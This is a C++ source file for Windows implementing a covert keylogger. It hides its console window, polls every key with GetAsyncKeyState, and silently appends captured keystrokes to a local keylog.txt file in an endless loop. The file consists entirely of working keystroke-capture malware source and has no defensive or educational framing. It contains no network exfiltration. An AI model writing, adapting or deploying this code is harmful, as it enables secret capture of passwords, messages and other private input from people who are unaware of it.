#include <iostream>
#include <fstream>
#include <windows.h>
#include <cctype>
#include <map>

std::map<int, std::string> myMap = {
    {1, "#LCK#"},
    {2, "#RCK#"},
    {9, "#TAB#"},
    {13, "#ENT#"},
    {16, " "},
    {20, "#CPL#"},
    {32, "#SPC#"},
    {33, "#PUP#"},
    {34, "#PDN#"},
    {37, "#LFA#"},
    {38, "#DNA#"},
    {39, "#RTA#"},
    {40, "#UPA#"},
    {91, "#WIN#"},
    {255, "#FNC#"},
};

void hideConsole(){
    // get the console window handle
    HWND consoleWindow = GetConsoleWindow(); 

    // check if console window handle retrieved
    if (consoleWindow != NULL) {
        ShowWindow(consoleWindow, SW_HIDE); // hide console
    }else{ exit(1); }
}

int main(){

    bool key_state[256] = {true}; // array to track key states
    char key_char = ' ';
    
    

    hideConsole();

    std::ofstream keylog("keylog.txt", std::ios::app); // open or create a text file in append mode

    // if the file didn't open, shut the program down
    if (!keylog.is_open()){
        exit(1);
    }

    // loop to continuously track key inputs
    while (true) {

        // check each key
        for (int vkey = 1; vkey <= 255; vkey++) {

            // check if key pressed
            if (GetAsyncKeyState(vkey) & 0x8000) {
                
                if (key_state[vkey]) {
                    continue; // skip this key if already pressed
                }
                std::cout << vkey;
                key_char = MapVirtualKey(vkey, MAPVK_VK_TO_CHAR);
                
                if (!key_state[VK_SHIFT]) { keylog << (char) tolower(key_char); std::cout << (char) tolower(key_char);}
                else{ keylog << key_char; std::cout << key_char;}
                
                keylog.flush(); // flush the output to the file
                
                key_state[vkey] = true; // update key state
            } else {
                key_state[vkey] = false; // update key state 
            }   
        }

        // delay to avoid high CPU usage
        Sleep(10);
    } 

    keylog.close();

    return 0;
}